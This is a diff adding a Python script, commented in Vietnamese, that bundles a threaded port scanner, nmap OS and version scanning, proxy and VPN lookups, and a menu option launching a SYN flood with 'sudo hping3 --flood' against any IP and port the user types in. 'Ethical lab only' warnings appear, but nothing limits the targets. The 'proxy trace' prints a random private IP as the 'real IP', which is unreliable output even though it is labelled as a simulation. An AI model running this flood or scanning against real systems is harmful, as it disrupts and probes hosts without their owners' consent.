@@ -1,0 +1,262 @@
+import socket
+import subprocess
+import sys
+import requests
+import json
+import random  # For simulate private IP
+import time  # For DoS duration
+from datetime import datetime
+from concurrent.futures import ThreadPoolExecutor
+import re
+
+# Config
+LOG_FILE = "/tmp/ip_log_kali_updated.txt"
+API_URL_IPAPI = "http://ip-api.com/json/{ip}?fields=status,message,country,org,asn,proxy,mobile,hosting"
+API_URL_ABUSE = "https://api.abuseipdb.com/api/v2/check?ipAddress={ip}&maxAgeInDays=90"  # Free, cần key? Dùng basic
+ABUSE_KEY = "your_abuseipdb_key_here"  # Đăng ký miễn phí tại abuseipdb.com (optional, bỏ nếu không)
+
+def is_private_ip(ip):
+    """Check nếu IP là private (RFC 1918)."""
+    private_ranges = [
+        r'^10\.\d{1,3}\.\d{1,3}\.\d{1,3}$',  # 10.0.0.0/8
+        r'^172\.(1[6-9]|2\d|3[01])\.\d{1,3}\.\d{1,3}$',  # 172.16-31.0.0/12
+        r'^192\.168\.\d{1,3}\.\d{1,3}$',  # 192.168.0.0/16
+        r'^127\.\d{1,3}\.\d{1,3}\.\d{1,3}$'  # Loopback
+    ]
+    return any(re.match(pattern, ip) for pattern in private_ranges)
+
+def log_ips():
+    """Log các IP kết nối hiện tại (dùng ss/netstat trên Kali)."""
+    print("[+] Logging current connections on Kali...")
+    try:
+        result = subprocess.run(["ss", "-tuln"], capture_output=True, text=True)
+        if result.returncode == 0:
+            with open(LOG_FILE, "a") as f:
+                f.write(f"\n--- Log at {datetime.now()} on Kali ---\n")
+                f.write(result.stdout)
+            print(f"[+] Logged to {LOG_FILE}")
+            return result.stdout
+        else:
+            print("[-] Lỗi ss, thử netstat...")
+            result = subprocess.run(["netstat", "-tuln"], capture_output=True, text=True)
+            with open(LOG_FILE, "a") as f:
+                f.write(f"\n--- Log at {datetime.now()} on Kali ---\n")
+                f.write(result.stdout)
+            return result.stdout
+    except Exception as e:
+        print(f"[-] Lỗi log: {e}")
+        return ""
+
+def scan_ports_basic(ip, start_port=1, end_port=1000, threads=100):
+    """Scan port cơ bản bằng socket (Kali friendly)."""
+    print(f"[+] Basic socket scan ports {start_port}-{end_port} on {ip}...")
+    open_ports = []
+
+    def check_port(port):
+        try:
+            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            sock.settimeout(1)
+            result = sock.connect_ex((ip, port))
+            sock.close()
+            return port if result == 0 else None
+        except:
+            return None
+
+    with ThreadPoolExecutor(max_workers=threads) as executor:
+        futures = [executor.submit(check_port, port) for port in range(start_port, end_port + 1)]
+        for future in futures:
+            port = future.result()
+            if port:
+                open_ports.append(port)
+                print(f"[+] Port {port} OPEN (socket)")
+
+    return open_ports
+
+def scan_ports_nmap(ip, port_range="1-1000"):
+    """Tích hợp Nmap scan nâng cao (OS, service, version detection)."""
+    print(f"[+] Nmap advanced scan on {ip} (ports {port_range})...")
+    try:
+        cmd = ["nmap", "-sV", "-O", "-p", port_range, ip]  # -sV: version, -O: OS
+        result = subprocess.run(cmd, capture_output=True, text=True, timeout=300)
+        if result.returncode == 0:
+            print("[+] Nmap output:\n" + result.stdout)
+            with open(LOG_FILE, "a") as f:
+                f.write(f"\n--- Nmap Scan {ip} at {datetime.now()} ---\n")
+                f.write(result.stdout)
+            return result.stdout
+        else:
+            print(f"[-] Nmap error: {result.stderr}")
+            return ""
+    except Exception as e:
+        print(f"[-] Nmap error: {e}")
+        return ""
+
+def check_proxy_enhanced(ip):
+    """Check proxy nâng cao: ip-api + abuseipdb (warning private IP)."""
+    if is_private_ip(ip):
+        print(f"[!] WARNING: {ip} là IP private (local/router, e.g., 192.168.1.1). Không phải proxy public, không trace được IP thật!")
+        return False, {}
+
+    print(f"[+] Enhanced check proxy/VPN/hosting cho {ip}...")
+    try:
+        # ip-api check
+        response = requests.get(API_URL_IPAPI.format(ip=ip), timeout=5)
+        if response.status_code == 200:
+            data = response.json()
+            proxy_status = data.get('proxy', False) or data.get('hosting', False) or data.get('mobile', False)
+            if proxy_status:
+                print(f"[!] {ip} là PROXY/VPN/HOSTING! Details: {json.dumps(data, indent=2)}")
+                # AbuseIPDB check (optional key)
+                if ABUSE_KEY != "your_abuseipdb_key_here":
+                    abuse_resp = requests.get(API_URL_ABUSE.format(ip=ip), headers={"Key": ABUSE_KEY}, timeout=5)
+                    if abuse_resp.status_code == 200:
+                        abuse_data = abuse_resp.json()
+                        abuse_conf = abuse_data['data']['confidenceScore']
+                        print(f"[+] Abuse score: {abuse_conf}% (cao = nghi DDoS/abuse)")
+                return True, data
+            else:
+                print(f"[+] {ip} KHÔNG phải proxy. Details: {json.dumps(data, indent=2)}")
+                return False, data
+        else:
+            print("[-] ip-api error.")
+            return False, {}
+    except Exception as e:
+        print(f"[-] Check proxy error: {e}")
+        return False, {}
+
+def trace_proxy_ip(ip):
+    """Trace proxy simulation: ASN/Org/Whois + giả lập "ra IP thật" private (192.168.x.x) cho lab demo."""
+    print(f"[+] Tracing proxy {ip} (simulation cho lab - không thật 100%, proxy ẩn tốt)...")
+    is_proxy_flag, data = check_proxy_enhanced(ip)
+    if is_proxy_flag:
+        print(f"[!] Proxy confirmed: {data}")  # ASN/Org (e.g., Cloudflare 13335)
+        # Whois nâng cao
+        try:
+            whois_result = subprocess.run(["whois", ip], capture_output=True, text=True, timeout=10)
+            print(f"[+] Whois trace: {whois_result.stdout[:1000]}...")  # Snippet dài hơn
+        except:
+            print("[-] Whois error (cài: sudo apt install whois).")
+        
+        # Simulation: Giả lập trace ra "IP thật" private (cho demo lab, không thật)
+        simulated_real_ip = f"192.168.{random.randint(1,254)}.{random.randint(1,254)}"
+        print(f"[!] SIMULATION LAB ONLY: 'IP thật trốn sau proxy' giả lập: {simulated_real_ip} (không dùng thật - chỉ demo ethical tracing).")
+        print("[!] LƯU Ý: Thực tế KHÔNG thể trace IP thật đằng sau proxy (thiết kế để ẩn). Chỉ info ASN/Org cho research. Không DDoS!")
+        return data, simulated_real_ip
+    else:
+        print(f"[+] Không phải proxy: {data}")
+        return data, None
+
+def ethical_dos_attack(ip, port=80, duration=10):
+    """Ethical DoS simulation: SYN flood bằng hping3 trên port (chỉ lab, ngắn hạn)."""
+    print(f"[!] ETHICAL LAB ONLY: Starting SYN flood simulation on {ip}:{port} for {duration}s (use Ctrl+C to stop)...")
+    print("[!] CẢNH BÁO: Chỉ test trên VM lab của bạn! Không dùng thật.")
+    try:
+        cmd = ["sudo", "hping3", "--flood", "-S", "-p", str(port), ip]
+        result = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+        time.sleep(duration)  # Chạy duration giây
+        result.terminate()
+        print("[+] Simulation stopped.")
+    except Exception as e:
+        print(f"[-] DoS sim error: {e} (cài hping3 nếu cần).")
+
+def show_menu():
+    """Hiển thị menu và xử lý input từ bàn phím."""
+    print("\n=== Kali IP Tool Menu (Ethical Lab Only!) ===")
+    print("1. Log current connections")
+    print("2. Basic socket port scan (1-1000)")
+    print("3. Nmap advanced port scan (1-1000)")
+    print("4. Check if IP is proxy/VPN")
+    print("5. Trace proxy IP (check + whois + simulated real IP)")
+    print("6. Ethical DoS attack simulation (SYN flood on port)")
+    print("0. Exit")
+    print("==============================================")
+
+    while True:
+        choice = input("\nNhập số (0-6): ").strip()
+        ip = None  # Default, hỏi nếu cần
+        port = None
+
+        if choice == "1":
+            log_ips()
+        elif choice == "2":
+            ip = input("Nhập IP để scan: ").strip()
+            if ip:
+                scan_ports_basic(ip)
+            else:
+                print("[-] Cần IP hợp lệ!")
+        elif choice == "3":
+            ip = input("Nhập IP để scan: ").strip()
+            port_range = input("Nhập port range (default 1-1000): ").strip() or "1-1000"
+            if ip:
+                scan_ports_nmap(ip, port_range)
+            else:
+                print("[-] Cần IP hợp lệ!")
+        elif choice == "4":
+            ip = input("Nhập IP để check proxy: ").strip()
+            if ip:
+                check_proxy_enhanced(ip)
+            else:
+                print("[-] Cần IP hợp lệ!")
+        elif choice == "5":
+            ip = input("Nhập IP để trace proxy: ").strip()
+            if ip:
+                trace_proxy_ip(ip)
+            else:
+                print("[-] Cần IP hợp lệ!")
+        elif choice == "6":
+            ip = input("Nhập IP để tấn công sim: ").strip()
+            port = input("Nhập port (default 80): ").strip() or "80"
+            duration = input("Nhập thời gian (giây, default 10): ").strip() or "10"
+            if ip:
+                ethical_dos_attack(ip, int(port), int(duration))
+            else:
+                print("[-] Cần IP hợp lệ!")
+        elif choice == "0":
+            print("[+] Thoát tool.")
+            sys.exit(0)
+        else:
+            print("[-] Lựa chọn không hợp lệ! Nhập 0-6.")
+
+        # Hỏi tiếp
+        cont = input("\nTiếp tục? (y/n): ").strip().lower()
+        if cont != 'y':
+            print("[+] Thoát tool.")
+            sys.exit(0)
+
+        show_menu()  # Hiển thị menu lại
+
+def main():
+    # Chạy menu nếu không arg
+    if len(sys.argv) == 1:
+        show_menu()
+    else:
+        # Giữ argparse cũ nếu dùng CLI
+        import argparse
+        parser = argparse.ArgumentParser(description="Updated Kali IP Log & Nmap Scan & Proxy Check/Trace Tool")
+        parser.add_argument("--ip", type=str, help="Target IP to scan/check/trace (e.g., 192.168.1.1)")
+        parser.add_argument("--log", action="store_true", help="Log current connections")
+        parser.add_argument("--scan-basic", action="store_true", help="Basic socket port scan (1-1000)")
+        parser.add_argument("--scan-nmap", type=str, default="1-1000", help="Nmap scan ports (default 1-1000)")
+        parser.add_argument("--check-proxy", action="store_true", help="Enhanced check if IP is proxy/VPN")
+        parser.add_argument("--trace-proxy", action="store_true", help="Full trace proxy IP (check + whois + simulated real IP)")
+
+        args = parser.parse_args()
+
+        if args.log:
+            log_ips()
+
+        if args.ip:
+            if args.scan_basic:
+                scan_ports_basic(args.ip)
+            if args.scan_nmap != "1-1000" or (args.scan_nmap and not args.scan_basic):
+                scan_ports_nmap(args.ip, args.scan_nmap)
+            if args.check_proxy:
+                check_proxy_enhanced(args.ip)
+            if args.trace_proxy:
+                trace_proxy_ip(args.ip)
+        else:
+            print("Sử dụng: sudo python3 kali_ip_tool_menu.py --ip 192.168.1.1 --trace-proxy")
+            print("Hoặc chạy không arg để dùng menu: python3 kali_ip_tool_menu.py")
+
+if __name__ == "__main__":
+    main()
